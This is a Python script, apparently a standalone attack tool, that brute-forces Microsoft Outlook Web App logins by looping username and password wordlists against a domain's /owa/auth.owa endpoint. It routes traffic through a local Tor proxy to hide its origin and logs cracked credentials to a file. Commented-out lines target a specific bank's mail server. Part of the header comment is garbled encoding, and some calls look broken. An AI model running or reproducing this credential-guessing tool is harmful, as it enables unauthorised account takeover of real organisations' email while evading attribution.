# coding:utf-8
import threading
import requests
import argparse
import sys
import time
'''
ÐèÒªµÚÒ»´Î·ÃÎÊ»ñÈ¡session£¬¼Óµ½dataÄÚÈÝÀïÃæ
'''
# parser = argparse.ArgumentParser(description='Microsoft OutLook WebAPP Brute Forcer.')
# parser.add_argument('domain', type=str, help='website domain name, e.g.
# email.baidu.com')
 
# args = parser.parse_args()
 


 #add https request use ssl,byxt
import urllib3.contrib.pyopenssl
urllib3.contrib.pyopenssl.inject_into_urllib3()
import certifi
import urllib3
http = urllib3.PoolManager(cert_reqs='CERT_REQUIRED',ca_certs=certifi.where(),retries=urllib3.Retry(10, redirect=8))



# from urllib3.contrib.socks import SOCKSProxyManager
# proxy= urllib3.contrib.socks.SOCKSProxyManager('socks5://127.0.0.1:9050')
# urllib3.disable_warnings()


proxy='127.0.0.1:9050'   #tor



# s =requests.session()
# s.keep_alive = False
# requests.adapters.DEFAULT_RETRIES = 5
# from requests.adapters import HTTPAdapter
# s = requests.Session()
# s.mount('http://stackoverflow.com', HTTPAdapter(max_retries=5))

def open_file(path):
    wordlist = []
    with open(path, 'r') as f:
        while True:
            word = f.readline().strip()
            if len(word) == 0:
                break
            wordlist.append(word)
    return wordlist
users = open_file('user.txt')
passwords = open_file('passwd.txt')
 
 
def get_session(domain):
 
    url = 'https://{url}/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f{urls}%2fowa%2f'.format(
        url=domain, urls=domain)
    time.sleep(1)
    response = http.request("get",url,timeout=5,retries=10,proxy=proxy)
    #response = requests.get(url,timeout=5,retries=10,proxy=proxy)
    res = dict(response.headers)
    session = res['Set-Cookie'].split(';')[0]
    print session
    return session
 
 
# response = http.request("get","https://mail.eu.bankcomm.com/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.eu.bankcomm.com%2fowa%2f",timeout=5,retries=10,proxy=proxy)

# response = requests.get("https://mail.eu.bankcomm.com/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.eu.bankcomm.com%2fowa%2f",timeout=5,retries=10,proxy=proxy)

def brute_outlook(domain):
    headers = {
        'Host': domain,
        'Connection': 'Keep-Alive',
        'Cache-Control': 'no-cache',
        'Origin': 'https://{}'.format(domain),
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Referer': 'https://{url}/owa/auth/logon.aspx?replaceCurrent=1&url=https://{urls}/owa/'.format(url=domain, urls=domain),
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.8,ru;q=0.6',
        'Cookie': ''
    }
    for user in users:
        for pwd in passwords:
            while True:
                try:
	                session = get_session(domain)
	                time.sleep(1)
	                break
                except:
                    print('error happened !!!#1')
            headers2 = headers
            headers2['Cookie'] = 'OutlookSession={}; PBack=0'.format(session)
            data = {'destination': 'https://{}/owa/'.format(domain),
                    'flags': '0',
                    'forcedownlevel': '0',
                    'trusted': '0',
                    'username': user,
                    'password': pwd,
                    'isUtf8': '1'
 
                    }
            while True:
                try:
                    target = 'https://' + domain + '/owa/auth.owa'
                    response =http.request("post",
                        target, data=data, headers=headers2,timeout=7,retries=10,proxy=proxy)#  
                    if dict(response.headers)['X-OWA-Version']:
                        print('crack success'+'-----'+ user+':'+pwd)
                        with open('crack_email.txt','a') as f:
                            f.write(user+'--------'+ pwd+ '\n')
                    break
                except:
                    print('error opened #2')
if __name__ == '__main__':
    if len(sys.argv) <2:
        print('python brute.py url')
        exit(0)
    domain = sys.argv[1]                            
    brute_outlook(domain)